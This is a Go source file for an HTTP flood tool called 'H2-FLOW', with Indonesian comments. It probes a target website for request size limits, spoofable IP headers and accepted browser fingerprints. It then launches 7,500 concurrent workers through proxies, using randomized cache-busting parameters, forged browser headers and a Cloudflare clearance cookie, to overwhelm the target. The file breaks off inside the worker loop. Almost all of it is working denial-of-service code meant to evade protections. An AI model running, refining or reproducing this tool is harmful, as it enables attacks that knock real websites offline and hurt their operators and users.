// ================== H2-FLOW ==================
package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ================== WARNA ==================
const (
	HAPUS  = "\033[0m"
	MERAH  = "\033[31m"
	IJO    = "\033[32m"
	PUTIH  = "\033[37m"
	CANDY  = "\033[91m"
	PUCAT  = "\033[38;5;203m"
	PUNYAMU = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"

	Speed = 7500
	to    = 6 * time.Second
	KEP   = 30 * time.Second
)

// ================== PROF ==================
type BPF struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
}

// ================== BROWSER ==================
var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

// ================== CACHE ==================
var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}

// ================== SESSION ==================
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}

// ================== REFERER ==================
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

type CLI struct {
	client *http.Client
	ip     string
}

// ================== PROSESOR ==================
func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

// ================== FAKE IP ==================
func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

// ================== DAMAGE ==================
func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var CCK string
var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

// ================== DAMAGE 1 ==================
func PMP(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
	Berhasil := 0
	for _, size := range sizes {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&big=" + strings.Repeat("x", size)
		} else {
			testURL += "?big=" + strings.Repeat("x", size)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			Berhasil = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return Berhasil
}

// ================== DAMAGE 2 ==================
func PMH(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
	Berhasil := 0
	for _, size := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			Berhasil = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return Berhasil
}

// ================== DAMAGE 3 ==================
func PHR(target string, ProxyX string) map[string]bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsedTarget, _ := url.Parse(target)
	targetHost := parsedTarget.Hostname()
	if ProxyX == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}

	HeadersBypas := []string{
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Request-ID",
		"CDN-Loop",
		"CF-Connecting-IP",
		"True-Client-IP",
	}
	result := make(map[string]bool)
	for _, h := range HeadersBypas {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", targetHost)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rand.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP":
			req.Header.Set("CF-Connecting-IP", ProxyX)
		case "True-Client-IP":
			req.Header.Set("True-Client-IP", ProxyX)
		}
		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

// ================== HTTP ==================
func HSUPPORT(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	port := "443"
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, port), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

// ================== ORIGIN ==================
func ORIGIN(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, origin := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, origin)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

// ================== USER AGENT ==================
func UA_TEST(target string) []string {
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

// ================== REFERER ==================
func REFFERER(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	testReferers := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, ref := range testReferers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if ref != "" {
			req.Header.Set("Referer", ref)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ref)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

// ================== METHOD HTTP ==================
func HMETHOD(target string) []string {
	methods := []string{"GET", "POST", "OPTIONS"}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, method := range methods {
		req, _ := http.NewRequest(method, target, nil)
		if method == "POST" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Body = io.NopCloser(strings.NewReader(""))
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, method)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "GET")
	}
	return valid
}

// ================== ENCODING ==================
func ENCOD(target string) []string {
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, enc := range encodings {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", enc)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, enc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

// ================== CACHE-CONTROL ==================
func CACH(target string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, cc := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", cc)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, cc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

// ================== ORIGIN ==================
type ORPL struct {
	Origin       string
	Referer      string
	SecFetchSite string
}

func GPFO(origin string, host string) ORPL {
	switch origin {
	case "https://" + host:
		return ORPL{
			Origin:       origin,
			Referer:      "https://" + host + "/",
			SecFetchSite: "same-origin",
		}
	case "https://www.google.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.google.com/search?q=" + host,
			SecFetchSite: "cross-site",
		}
	case "https://www.bing.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.bing.com/search?q=" + host,
			SecFetchSite: "cross-site",
		}
	case "https://www.yahoo.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.yahoo.com/search?p=" + host,
			SecFetchSite: "cross-site",
		}
	default:
		return ORPL{
			Origin:       "",
			Referer:      "",
			SecFetchSite: "cross-site",
		}
	}
}

// ================== MAIN ==================
func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: H2-FLOW.go <target> <duration> <cookie>")
		fmt.Println("Contoh: H2-FLOW.go https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		CCK = os.Args[3]
	}
	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}

	var PRX []*url.URL

	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				PRX = append(PRX, p)
			}
		}
	}
	if len(PRX) == 0 {
		PRX = append(PRX, nil)
	}
	var ProxyX string
	var proxyIPs []string
	for _, p := range PRX {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) > 0 {
		ProxyX = proxyIPs[0]
	}

	// Siapkan daftar IP untuk header (fallback jika tidak ada proxy)
	ipPool := proxyIPs
	if len(ipPool) == 0 {
		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}

	// ================== PROBING ==================
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	var (
		MaxP      int
		MaxHead   int
		Supported map[string]bool
		HVERSI    string
		VORI      []string
		VUAS      []string
		VREF      []string
		VMET      []string
		VENC      []string
		VCAC      []string
	)

	var wg sync.WaitGroup
	wg.Add(10)

	var probeDone int
	var probeMu sync.Mutex

	printProbe := func(name string) {
		probeMu.Lock()
		probeDone++
		done := probeDone
		probeMu.Unlock()
		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
	}

	go func() {
		defer wg.Done()
		MaxP = PMP(tgt)
		printProbe("PMP")
	}()
	go func() {
		defer wg.Done()
		MaxHead = PMH(tgt)
		printProbe("PMH")
	}()
	go func() {
		defer wg.Done()
		Supported = PHR(tgt, ProxyX)
		printProbe("PHR")
	}()
	go func() {
		defer wg.Done()
		HVERSI = HSUPPORT(tgt)
		printProbe("HSP")
	}()
	go func() {
		defer wg.Done()
		VORI = ORIGIN(tgt)
		printProbe("ORIGIN")
	}()
	go func() {
		defer wg.Done()
		VUAS = UA_TEST(tgt)
		printProbe("UA")
	}()
	go func() {
		defer wg.Done()
		VREF = REFFERER(tgt)
		printProbe("REFFERER")
	}()
	go func() {
		defer wg.Done()
		VMET = HMETHOD(tgt)
		printProbe("HMETHOD")
	}()
	go func() {
		defer wg.Done()
		VENC = ENCOD(tgt)
		printProbe("ENCOD")
	}()
	go func() {
		defer wg.Done()
		VCAC = CACH(tgt)
		printProbe("CACHE")
	}()

	wg.Wait()
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	// ================== BUAT CLIENT ==================
	wcs := make([]CLI, len(PRX))
	for i, ProxyY := range PRX {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   4 * time.Second,
				KeepAlive: KEP,
			}).DialContext,
			DisableKeepAlives:     false,
			DisableCompression:    false,
			MaxIdleConns:          10000,
			MaxIdleConnsPerHost:   5000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       KEP,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
		}
		ip := ""
		if ProxyY != nil {
			tr.Proxy = http.ProxyURL(ProxyY)
			ip = ProxyY.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	// ================== LOGO ==================
	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", PUNYAMU)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", PUCAT)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", MERAH)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", CANDY)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}

	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "H2-FLOW                    ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", HVERSI), "True")
	if CCK != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			MERAH, IJO, "True", MERAH)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			PUTIH, IJO, "None", PUTIH)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	// ================== TIMER ==================
	Start_Main := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(Start_Main).Seconds())
				if elapsed > dur && dur > 0 {
					elapsed = dur
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					IJO, HAPUS,
					PUTIH, HAPUS,
					MERAH, HAPUS,
					PUTIH, elapsed, dur, HAPUS,
					MERAH, IJO, "True", MERAH)
			}
		}
	}()
	var wg2 sync.WaitGroup
	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	// ================== WORKER ==================
	// struct untuk dynamic header ordering
	type headerItem struct {
		key, value string
	}

	for i := 0; i < Speed; i++ {
		wg2.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg2.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			for ctx.Err() == nil {
				method := VMET[rng.Intn(len(VMET))]
				ua := VUAS[rng.Intn(len(VUAS))]
				ref := VREF[rng.Intn(len(VREF))]
				enc := VENC[rng.Intn(len(VENC))]
				cacheCtrl := VCAC[rng.Intn(len(VCAC))]

				FORIP := ipPool[rng.Intn(len(ipPool))]
				realIP := cli.ip
				if realIP == "" {
					realIP = FORIP
				}

				SLOR := VORI[rng.Intn(len(VORI))]
				OPRF := GPFO(SLOR, host)
				prof := PFS[rng.Intn(len(PFS))]

				// ===== POIN 3: multiple parameter (2-3) =====
				params := []string{}
				for j := 0; j < 2+rng.Intn(2); j++ {
					key := CBP[rng.Intn(len(CBP))]
					val := strconv.FormatInt(rng.Int63(), 10)
					params = append(params, key+"="+val)
				}
				var targetURL string
				if strings.Contains(tgt, "?") {
					targetURL = tgt + "&" + strings.Join(params, "&")
				} else {
					targetURL = tgt + "?" + strings.Join(params, "&")
				}
				if MaxP > 0 && rng.Intn(3) == 0 {
					size := MaxP/2 + rng.Intn(MaxP/2)
					if size < 1 {
						size = 64
					}
					targetURL += "&big=" + strings.Repeat("x", size)
				}
				if rng.Intn(10) == 0 {
					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
				}

				// Buat request tanpa header dulu
				var body io.Reader
				if method == "POST" {
					body = strings.NewReader("")
				} else {
					body = nil
				}
				req, _ := http.NewRequest(method, targetURL, body)
				// Header akan diisi setelah dikumpulkan dan diacak
				// Kita kumpulkan semua header dalam slice
				headers := []headerItem{}

				// Method POST specific
				if method == "POST" {
					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
				}

				// Header dasar
				headers = append(headers, headerItem{"User-Agent", ua})
				headers = append(headers, headerItem{"Accept-Encoding", enc})
				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})

				if OPRF.Origin != "" && OPRF.Referer != "" {
					headers = append(headers, headerItem{"Referer", OPRF.Referer})
				} else if ref != "" {
					headers = append(headers, headerItem{"Referer", ref})
				}
				if OPRF.Origin != "" {
					headers = append(headers, headerItem{"Origin", OPRF.Origin})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})

				headers = append(headers, headerItem{"Accept", prof.Accept})
				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
				headers = append(headers, headerItem{"Connection", "keep-alive"})
				headers = append(headers, headerItem{"Pragma", "no-cache"})
				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
				headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})

				if prof.SecChUa != "" {
					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
				}
